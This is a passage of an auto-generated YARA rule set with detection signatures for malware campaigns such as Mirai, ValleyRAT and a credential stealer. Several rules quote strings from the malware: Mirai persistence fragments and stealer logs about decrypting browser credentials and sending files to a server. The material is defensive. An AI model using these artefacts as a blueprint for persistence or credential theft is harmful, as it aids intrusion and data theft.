        hash = "52e1f2b256e2b9d6547883f885c67fdc55f62dda866b5fc245d4c700352f20de"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/dotnet_typelib_guid-c37488c8.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" ascii
        $s1 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s2 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" ascii
        $s3 = "CABAFE20CFEA6C92D3377C14650461E190857D48D13934B5562233C314AAFBB5" ascii
        $s4 = "0C50C67E839472CD612D6033109F5E032987E48E367247F29C0EB30A1D3EB5FC" ascii
        $s5 = "42FC44596E89DA5AE6D4D3E3F99803B92713C413F3B56B0F59C5CC4E681E362C" ascii
        $s6 = "E123F60E9FC6E974D1381F2F15FB19E7960628CC8925D65E344C2F2BDC64F424" ascii
        $s7 = "$4a2f8fb6-1077-469a-9246-736e6afe8da1" ascii
        $s8 = "ProcessClientBufferNotReceived1" ascii
        $s9 = "ProcessClientBufferReceived1" ascii
        $s10 = "ProcessClientBufferReceived2" ascii
        $s11 = "CaptureResizeReduceQuality" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_d723ca3c_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-d723ca3c"
        date = "2026-10-21"
        campaign = "tlsh-d723ca3c"
        family = ""
        hash = "36ea1095d1be5b0c95ad214745f8622b6eba26d1f944bab8641431c61f11dba0"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-d723ca3c.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "com/sun/jna/platform/win32/WinCrypt$CRYPT_ALGORITHM_IDENTIFIER$ByReference.classPK" ascii
        $s1 = "com/sun/jna/platform/win32/WinCrypt$CERT_STRONG_SIGN_SERIALIZED_INFO$ByReference.classPK" ascii
        $s2 = "com/sun/jna/platform/win32/HighLevelMonitorConfigurationAPI$MC_DISPLAY_TECHNOLOGY_TYPE$ByReference.c" ascii
        $s3 = "com/sun/jna/platform/win32/Winevt$EVT_CHANNEL_CONFIG_PROPERTY_ID.classPK" ascii
        $s4 = "com/sun/jna/platform/win32/WinCrypt$CERT_STRONG_SIGN_PARA$DUMMYUNION.classPK" ascii
        $s5 = "com/sun/jna/platform/win32/Winevt$EVT_SUBSCRIBE_NOTIFY_ACTION.classPK" ascii
        $s6 = "com/sun/jna/platform/win32/HighLevelMonitorConfigurationAPI$MC_DISPLAY_TECHNOLOGY_TYPE.classPK" ascii
        $s7 = "com/sun/jna/platform/win32/WinCrypt$CERT_CHAIN_POLICY_STATUS$ByReference.classPK" ascii
        $s8 = "com/sun/jna/platform/win32/Winsvc$SERVICE_FAILURE_ACTIONS$ByReference.classPK" ascii
        $s9 = "com/sun/jna/platform/win32/WinCrypt$CRYPT_ALGORITHM_IDENTIFIER.classPK" ascii
        $s10 = "com/sun/jna/platform/win32/COM/Wbemcli$WBEM_CONDITION_FLAG_TYPE.classPK" ascii
        $s11 = "com/sun/jna/platform/win32/Winevt$EVT_PUBLISHER_METADATA_PROPERTY_ID.classPK" ascii
    condition:
        filesize < 13260288 and 12 of them
}

rule Sightlines_tlsh_4f1daa3d_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-4f1daa3d"
        date = "2026-10-21"
        campaign = "tlsh-4f1daa3d"
        family = "mirai"
        hash = "0ad07ef254e4aa14d108354f84fc4dfc27754b5e6f7de54ecd877466b4978bd5"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-4f1daa3d.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "cat > \"$d/network-dispatch.service\" <<EOF" ascii
        $s1 = "ln -sf \"$d/network-dispatch.service\" \"$d/multi-user.target.wants/network-dispatch.service\"" ascii
        $s2 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ascii
        $s3 = "/magisk/.core/service.d/99-network-dispatch" ascii
        $s4 = "/root/.config/systemd/user/network-dispatch.service" ascii
        $s5 = "/etc/udev/rules.d/99-network-dispatch.rules" ascii
        $s6 = "Cache-Control: no-cache, no-store, must-revalidate" ascii
        $s7 = "option post_install_hook /etc/init.d/network-dispatch" ascii
        $s8 = "Noise_IKpsk2_25519_ChaChaPoly_BLAKE2s" ascii
        $s9 = "rc_startup=/etc/init.d/network-dispatch start" ascii
        $s10 = "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6" ascii
        $s11 = "/etc/xdg/autostart/network-dispatch.desktop" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_imphash_74297425_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-74297425"
        date = "2026-10-21"
        campaign = "imphash-74297425"
        family = ""
        hash = "a1a2bacd58d1327ab929b9e74b732735532dc645447db012baae31619d884bab"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-74297425.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "INSERT INTO %s.sqlite_schema SELECT*FROM \"%w\".sqlite_schema WHERE type IN('view','trigger') OR(type=" ascii
        $s1 = "SELECT'INSERT INTO %s.'||quote(name)||' SELECT*FROM\"%w\".'||quote(name)FROM %s.sqlite_schema WHERE ty" ascii
        $s2 = ".?AV?$_Func_impl_no_alloc@V<lambda_1>@?2??pack_pkg_to_buffer@@YA_NAEBV?$basic_string@DU?$char_traits" ascii
        $s3 = ".?AV?$_Func_impl_no_alloc@V<lambda_1>@?2??run_vs_projects_scan@@YAXAEBV?$basic_string@DU?$char_trait" ascii
        $s4 = ".?AV<lambda_1>@?2??pack_pkg_to_buffer@@YA_NAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@" ascii
        $s5 = ".?AV<lambda_1>@?2??run_vs_projects_scan@@YAXAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D" ascii
        $s6 = ".?AV?$_Func_impl_no_alloc@P6A_NAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z_N" ascii
        $s7 = ".?AV?$_Ref_count_obj2@$$CBUStubRuntimeDetail@@@std@@" ascii
        $s8 = "2@@std@@AEBUPkgMeta@@0AEBV?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@s" ascii
        $s9 = ".?AV?$_Func_base@XAEAV?$basic_json@Vmap@std@@Vvector@2@V?$basic_string@DU?$char_traits@D@std@@V?$all" ascii
        $s10 = "@D@std@@V?$allocator@D@2@@std@@AEBUPkgMeta@@0AEBV?$unordered_map@V?$basic_string@DU?$char_traits@D@s" ascii
        $s11 = ".?AU?$output_adapter_protocol@D@detail@json_abi_v3_12_0@nlohmann@@" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 6652928 and 12 of them
}

rule Sightlines_tlsh_0cb74316_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-0cb74316"
        date = "2026-10-21"
        campaign = "tlsh-0cb74316"
        family = "mirai"
        hash = "543fd82ceb6c89a3ffad20ce19455d9ff09696c3da1c7884ff427e4bf7d8a6b4"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-0cb74316.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/home/firmware/build/temp-sh4/gcc-core/gcc/config/sh/lib1funcs.asm" ascii
        $s1 = "__linuxthreads_initial_report_events" ascii
        $s2 = "__GI_pthread_attr_getschedpolicy" ascii
        $s3 = "__GI_pthread_attr_setschedpolicy" ascii
        $s4 = "__pthread_wait_for_restart_signal" ascii
        $s5 = "__stdio_mutex_initializer.3812" ascii
        $s6 = "__GI_pthread_attr_getinheritsched" ascii
        $s7 = "__GI___rpc_thread_svc_max_pollfd" ascii
        $s8 = "__GI_pthread_attr_setinheritsched" ascii
        $s9 = "__pthread_kill_other_threads_np" ascii
        $s10 = "__GI_pthread_attr_getschedparam" ascii
        $s11 = "__pthread_set_own_extricate_if" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_contacted_38398ec3_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign contacted-38398ec3"
        date = "2026-10-23"
        campaign = "contacted-38398ec3"
        family = ""
        hash = "0d481085dbdf8010e4f8ae81f15c94dc17cac8c0d3b82b66f2bf63349eb217ac"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/contacted-38398ec3.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "$Id: UPX 4.22 Copyright (C) 1996-2024 the UPX Team. All Rights Reserved. $" ascii
        $s1 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $" ascii
        $s2 = "PROT_EXEC|PROT_WRITE failed." ascii
        $s3 = "BN4/mG7otq7uVCjF" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 4 of them
}

rule Sightlines_mutex_901029f8_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign mutex-901029f8"
        date = "2026-10-23"
        campaign = "mutex-901029f8"
        family = ""
        hash = "17bf039a9a73ecb31518e497cf516bdb7fa2468e156d352712cb928eb3e33fa1"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/mutex-901029f8.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "<assembly manifestVersion=\"1.0\" xmlns=\"urn:schemas-microsoft-com:asm.v1\">" ascii
        $s1 = "KmuX}}O|zmvk|}\\az|impvwQxw}u|k" ascii
        $s2 = "STEP after HomeCast NULL" ascii
        $s3 = "STEP before Invoke_3" ascii
        $s4 = "STEP after Invoke_3" ascii
        $s5 = "D$XH9D$xsIHcD$0H9D$xs=H" ascii
        $s6 = "STEP after VeilCast" ascii
        $s7 = "STEP before FaceArm" ascii
        $s8 = "CertOpenSystemStoreW" ascii
        $s9 = "fKq]LjUYKsZoY_HUSR" ascii
        $s10 = "STEP after FaceArm" ascii
        $s11 = "Custom Gradient" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 31400960 and 12 of them
}

rule Sightlines_signer_cert_sha1_33370058_blackmoon
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign signer_cert_sha1-33370058"
        date = "2026-10-20"
        campaign = "signer_cert_sha1-33370058"
        family = "blackmoon"
        hash = "6f9f663f832a06474913ec6bb0f94e3cca6e0658396a68053ff36abedbb050ba"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/signer_cert_sha1-33370058.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "370624235959Z0r1" ascii
        $s1 = "Greater London1" ascii
        $s2 = "410324235959Z0U1" ascii
        $s3 = "380118235959Z0W1" ascii
        $s4 = "Ly<j}bx^H" ascii
        $s5 = "260325000000Z" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 4529936 and 6 of them
}

rule Sightlines_tlsh_4bbbd18e_valleyrat
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-4bbbd18e"
        date = "2026-10-18"
        campaign = "tlsh-4bbbd18e"
        family = "valleyrat"
        hash = "30db42655bcacbda1562247e429059f446d96719d8145fd467447dd8625b98bb"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-4bbbd18e.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "5Digital ID Class 3 - Microsoft Software Validation v21,0*" ascii
        $s1 = "#Take-Two Interactive Software, Inc.0" ascii
        $s2 = "#Take-Two Interactive Software, Inc.1" ascii
        $s3 = "a formatting trait implementation returned an error when the underlying stream did notError" ascii
        $s4 = "Rockstar Games1>0<" ascii
        $s5 = "NtDelayExecution" ascii
        $s6 = "L$,D3D$,D3D$,D3D$,A1" ascii
        $s7 = "{9DSLPnAmIDPw_" ascii
        $s8 = "lBW8uP$Q9HPj1" ascii
        $s9 = "uPjpHll9qeBQ7" ascii
        $s10 = "l$q6QjB81]*1B" ascii
        $s11 = ")14:EFIJNOde" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 17396544 and 11 of them
}

rule Sightlines_tlsh_a6149b59_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-a6149b59"
        date = "2026-10-20"
        campaign = "tlsh-a6149b59"
        family = ""
        hash = "77283baa36cee15b9d4d5f9ae252fc2bbd2e0e7ff3dae0994786ecb338c6f81d"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-a6149b59.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "com/github/noamm9/event/impl/PlayerInteractEvent$RIGHT_CLICK$ENTITY.classPK" ascii
        $s1 = "com/github/noamm9/event/impl/PlayerInteractEvent$RIGHT_CLICK$BLOCK.classPK" ascii
        $s2 = "com/github/noamm9/event/impl/PlayerInteractEvent$RIGHT_CLICK$AIR.classPK" ascii
        $s3 = "com/github/noamm9/features/impl/dev/FEAT_WebSocket$init$6$1.classPK" ascii
        $s4 = "com/github/noamm9/event/impl/PlayerInteractEvent$LEFT_CLICK$ENTITY.classPK" ascii
        $s5 = "com/github/noamm9/event/impl/PlayerInteractEvent$LEFT_CLICK$BLOCK.classPK" ascii
        $s6 = "com/github/noamm9/event/impl/PlayerInteractEvent$LEFT_CLICK$AIR.classPK" ascii
        $s7 = "com/github/noamm9/event/impl/PlayerInteractEvent$RIGHT_CLICK.classPK" ascii
        $s8 = "com/github/noamm9/features/impl/floor7/LeapCounter$REGION$updateCounter$1.classPK" ascii
        $s9 = "com/github/noamm9/event/impl/PlayerInteractEvent$LEFT_CLICK.classPK" ascii
        $s10 = "com/github/noamm9/features/impl/floor7/LeapCounter$REGION.classPK" ascii
        $s11 = "com/github/noamm9/features/impl/dungeon/solvers/puzzles/WaterBoardSolver$LEVER$Companion.classPK" ascii
    condition:
        filesize < 27263666 and 12 of them
}

rule Sightlines_imphash_8094c7bf_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-8094c7bf"
        date = "2026-10-20"
        campaign = "imphash-8094c7bf"
        family = ""
        hash = "0059a3866d1902467dd4fe64108aefd5c7fd2856a794a251c2b28004a92257b9"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-8094c7bf.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "The result is too small to be represented (UNDERFLOW)" ascii
        $s1 = "random_device::random_device(const std::string&): unsupported token" ascii
        $s2 = "random_device::random_device(const std::string&): device not available" ascii
        $s3 = "%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p." ascii
        $s4 = "basic_string::_S_construct null not valid" ascii
        $s5 = "std::basic_string<char, std::char_traits<char>, std::allocator<char> >" ascii
        $s6 = "basic_string: construction from null is not valid" ascii
        $s7 = "only http:// urls are supported for downloads" ascii
        $s8 = "std::basic_iostream<char, std::char_traits<char> >" ascii
        $s9 = "std::basic_ostream<char, std::char_traits<char> >" ascii
        $s10 = "only http:// urls are supported for the geo lookup" ascii
        $s11 = "the network helper is missing required exports" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_fb715736_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-fb715736"
        date = "2026-10-20"
        campaign = "tlsh-fb715736"
        family = ""
        hash = "04f32dd4e681959fb26a3d11aa58874680d1a867b2ca5770670c2fdf91736a04"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-fb715736.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "com/odtheking/odin/features/impl/skyblock/QuiverDisplay$quiverHud$2.classPK" ascii
        $s1 = "com/odtheking/odin/utils/skyblock/dungeon/terminals/TerminalTypes$STARTS_WITH.classPK" ascii
        $s2 = "com/odtheking/odin/features/impl/boss/WitherDragonsEnumKt$handleSpawnPacket$2$1.classPK" ascii
        $s3 = "com/odtheking/odin/utils/skyblock/dungeon/terminals/TerminalTypes$NUMBERS.classPK" ascii
        $s4 = "com/odtheking/odin/features/impl/skyblock/PlayerDisplay$overflowManaHud$2.classPK" ascii
        $s5 = "com/odtheking/odin/utils/network/WebUtils$sam$java_util_function_BiConsumer$0.classPK" ascii
        $s6 = "com/odtheking/odin/features/impl/boss/termGUI/MelodyGui$buildTerminal$1$1.classPK" ascii
        $s7 = "com/odtheking/odin/features/impl/skyblock/ChatCommands$partyAllInvite$2.classPK" ascii
        $s8 = "com/odtheking/odin/features/impl/skyblock/PlayerDisplay$hideOverflow$2.classPK" ascii
        $s9 = "com/odtheking/odin/features/impl/dungeon/InvincibilityTimer$equippedMaskColor$2.classPK" ascii
        $s10 = "com/odtheking/odin/features/impl/skyblock/PlayerDisplay$hideZeroSF$2.classPK" ascii
        $s11 = "com/odtheking/odin/utils/skyblock/dungeon/terminals/TerminalTypes$MELODY.classPK" ascii
    condition:
        filesize < 7770436 and 12 of them
}

rule Sightlines_dotnet_typelib_guid_8165a7e1_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign dotnet_typelib_guid-8165a7e1"
        date = "2026-10-20"
        campaign = "dotnet_typelib_guid-8165a7e1"
        family = ""
        hash = "9db92c127123dcc94f94e84e8745faa84420f8235069478f7081dce39f4452c3"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/dotnet_typelib_guid-8165a7e1.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" ascii
        $s1 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s2 = "DILUVIUM! Flumen inundat cavernam (Flood pulse cleans sediment & fills channels)." wide
        $s3 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" ascii
        $s4 = "RUINA! Eventus collapsus factus est! (A collapse event occurred!)" wide
        $s5 = "Configuratio servata est! (Configuration saved successfully)" wide
        $s6 = "Raining! Aqua crescit in siphone (Rain level rises in the sump)." wide
        $s7 = "Calcit Saturation must be between 0 and 100!" wide
        $s8 = "C290034A97A61A2F8BE41E55B594BC89F452E69C81BDAAFD00ADEF95BB51419A" ascii
        $s9 = "CD1BA97F43CC8DC3152172D7F2EA7B953ADE66EE8713FFA8E1DEEFC30CCCC45B" ascii
        $s10 = "24C80B0C1D0F8977AA8C6ED3633A88E27663B9FBFFACF2EEE8A488EB3A86FE14" ascii
        $s11 = "CaveSystem.Properties.Resources.resources" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 2165760 and 12 of them
}

rule Sightlines_dotnet_typelib_guid_0d40ebc9_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign dotnet_typelib_guid-0d40ebc9"
        date = "2026-10-20"
        campaign = "dotnet_typelib_guid-0d40ebc9"
        family = ""
        hash = "06c56f65089f4ba588265fa1f56cbccbfe5e9a450160d13d8b3a575a4faf07fe"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/dotnet_typelib_guid-0d40ebc9.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "<ViikkoSimulaatioData xmlns=\"http://tempuri.org/KellokoneistoSchema.xsd\">" wide
        $s1 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" ascii
        $s2 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s3 = "Kertynyt Virhe (Cumulative Error): {0:+0.0;-0.0;0.0} s" wide
        $s4 = "Kertynyt Virhe (Cumulative Error): +12.4 s" wide
        $s5 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" ascii
        $s6 = "yntivakaus (Rate Stability): {0:+0.0;-0.0;0.0} s/day" wide
        $s7 = "  <LampotilaKeskiarvo>{0:F1}</LampotilaKeskiarvo>" wide
        $s8 = "Status: Ticking | Escapement: Deadbeat | L: 1.0m" wide
        $s9 = "<PainoKorkeusMaksimisuhta>k__BackingField" ascii
        $s10 = "<VirheHistoriaSecPerDay>k__BackingField" ascii
        $s11 = "  <KertynytVirheSekuntia>{0:F2}</KertynytVirheSekuntia>" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 3564544 and 10 of them
}

rule Sightlines_tlsh_e3e245a5_blakcseestealer
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-e3e245a5"
        date = "2026-10-20"
        campaign = "tlsh-e3e245a5"
        family = "blakcseestealer"
        hash = "554fb593a7e086360b68f90dfcee8aef9bd9a25659dedae188a85bd756b3ea87"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-e3e245a5.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = ".?AV?$_Func_impl_no_alloc@V<lambda_68e3b65500009b224cfd4b39ddd88c46>@@XAEBV?$basic_string@DU?$char_t" ascii
        $s1 = ".?AV?$_Func_impl_no_alloc@V<lambda_2bd2efc0f489c80c64f6c76a3f06661d>@@XAEBV?$basic_string@DU?$char_t" ascii
        $s2 = "GetElevationKey: FINAL RESULT - COM decryption failed (empty result)" ascii
        $s3 = "Payload DLL: CLSIDFromString failed, hr=0x%08X, clsid=%s" ascii
        $s4 = "Payload DLL: CoCreateInstance(Edge) failed, hr=0x%08X, err=%lu" ascii
        $s5 = "(match_len >= TDEFL_MIN_MATCH_LEN) && (match_dist >= 1) && (match_dist <= TDEFL_LZ_DICT_SIZE)" wide
        $s6 = "Payload DLL: DecryptData FAILED, hr=0x%08X, COM_lastErr=%lu, GetLastErr=%lu" ascii
        $s7 = "Payload DLL: IIDFromString failed, hr=0x%08X, iid=%s" ascii
        $s8 = "DecryptDPAPI: CryptUnprotectData FAILED, error=0x%08X (%lu)" ascii
        $s9 = "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall" wide
        $s10 = "CallCOMDecryptData: Bootstrap TIMEOUT or FAILED, result=%d" ascii
        $s11 = "SendFileToServer: shutdown(SD_SEND), waiting for response..." ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1811456 and 9 of them
}

rule Sightlines_imphash_7fa38c68_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-7fa38c68"
        date = "2026-10-20"
        campaign = "imphash-7fa38c68"
        family = ""
        hash = "4fc04b64ff9fe77be60ebf30dec9bf876ccc5eff4e344f8f23cddaeeb4485957"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-7fa38c68.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "6d0da78}\"/><supportedOS Id=\"{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}\"/><supportedOS Id=\"{35138b9a-5d96" ascii
        $s1 = "ortedOS Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\"/><supportedOS Id=\"{1f676c76-80e1-4239-95bb-83d0f" ascii
        $s2 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:as" ascii
        $s3 = "ndentAssembly></dependency><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedP" ascii
        $s4 = "m.v1\" manifestVersion=\"1.0\"><assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"*\" name=\"Null" ascii
        $s5 = "-4fbd-8e2d-a2440225f93a}\"/></application></compatibility></assembly>" ascii
        $s6 = "ependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\"" ascii
        $s7 = "ity></trustInfo><compatibility xmlns=\"urn:schemas-microsoft-com:compatibility.v1\"><application><supp" ascii
        $s8 = "RMDir: RemoveDirectory invalid input(\"%s\")" wide
        $s9 = "File: overwriteflag=%d, allowskipfilesflag=%d, name=\"%s\"" wide
        $s10 = "rivileges><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></secur" ascii
        $s11 = "ExecShell: warning: error (\"%s\": file:\"%s\" params:\"%s\")=%d" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 2696016 and 12 of them
}

rule Sightlines_imphash_ecfe772f_andydesk
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-ecfe772f"
        date = "2026-10-20"
        campaign = "imphash-ecfe772f"
        family = "andydesk"
        hash = "05a6ae375ef48f48f368aa71b7b1aaabd99a55bf9a857c4f0caf57a2878cea27"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-ecfe772f.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "SOFTWARE\\4t Niagara Software\\4t Tray Minimizer\\Options\\ExclusionList" ascii
        $s1 = "SOFTWARE\\4t Niagara Software\\4t Tray Minimizer\\Options\\DefaultForAllApp" ascii
        $s2 = "SOFTWARE\\4t Niagara Software\\4t Tray Minimizer\\Options\\CustApp0" ascii
        $s3 = "SOFTWARE\\4t Niagara Software\\4t Tray Minimizer\\Options\\CustApp1" ascii
        $s4 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"> " ascii
        $s5 = " deflate 1.1.4 Copyright 1995-2002 Jean-loup Gailly " ascii
        $s6 = " inflate 1.1.4 Copyright 1995-2002 Mark Adler " ascii
        $s7 = "SOFTWARE\\4t Niagara Software\\4t Tray Minimizer\\View" ascii
        $s8 = "SOFTWARE\\Microsoft\\.NETFramework\\policy" ascii
        $s9 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\" ascii
        $s10 = "Show 4t Tray Minimizer popup menu.Enabled" ascii
        $s11 = "\\Microsoft\\Internet Explorer\\Quick Launch" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 3687060 and 12 of them
}

rule Sightlines_rich_header_hash_0fc4db97_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign rich_header_hash-0fc4db97"
        date = "2026-10-24"
        campaign = "rich_header_hash-0fc4db97"
        family = ""
        hash = "1bc82bed6143d2bf1b6b08a7809f4a5e29317d6fddd338a7da3c0223522e4bbf"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/rich_header_hash-0fc4db97.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "10.0.26100.1742 (WinBuild.160101.0800)" wide
        $s1 = "ApiSet Stub DLL" wide
        $s2 = "apisetstub" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 3 of them
}

rule Sightlines_tlsh_9de2707e_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-9de2707e"
        date = "2026-10-20"
        campaign = "tlsh-9de2707e"
        family = "mirai"
        hash = "1410244e815eabf714a977ab9b20372c270046ec5bd90c8e05e94bf62386d9b5"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-9de2707e.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "kZPUbHYdNYRDXBjbR4SeWvUfvD5Sc90wMrC8XGa2Z54=" ascii
        $s1 = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ascii
        $s2 = "Noise_IKpsk2_25519_ChaChaPoly_BLAKE2s" ascii
        $s3 = "Accept-Language: en-US,en;q=0.9" ascii
        $s4 = "X-Requested-With: XMLHttpRequest" ascii
        $s5 = "Accept-Encoding: gzip, deflate" ascii
        $s6 = "    -> skip TOCTOU: pid recycled" ascii
        $s7 = " skip=exe-owner-only(not-root)" ascii
        $s8 = "application/json,text/plain,*/*" ascii
        $s9 = "    -> skip TOCTOU: stat gone" ascii
        $s10 = "/sys/devices/system/cpu/online" ascii
        $s11 = "Content-Length: 2147483647" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_c0f4d43a_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-c0f4d43a"
        date = "2026-10-20"
        campaign = "tlsh-c0f4d43a"
        family = ""
        hash = "7c9f3fa98d0678d1fe429825625bd06306d47a4b2a7d4c710c1f4d02165c39e4"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-c0f4d43a.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "command line encoding conversion failure" ascii
        $s1 = "XPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPAD" ascii
        $s2 = "Windows original main args:" ascii
        $s3 = "JLI_InitArgProcessing" ascii
        $s4 = "_JAVA_LAUNCHER_DEBUG" ascii
        $s5 = "JLI_GetStdArgc" ascii
        $s6 = "JLI_GetStdArgs" ascii
        $s7 = "380114235959Z0i1" ascii
        $s8 = "JLI_CmdToArgs" ascii
        $s9 = "360903235959Z0c1" ascii
        $s10 = "JLI_MemAlloc" ascii
        $s11 = "Full Version" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_imphash_a401ad4f_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-a401ad4f"
        date = "2026-10-20"
        campaign = "imphash-a401ad4f"
        family = ""
        hash = "188a79e5b0aeb2656c15fc167bac923b94752b98996f1981e95c173729ce7a0f"
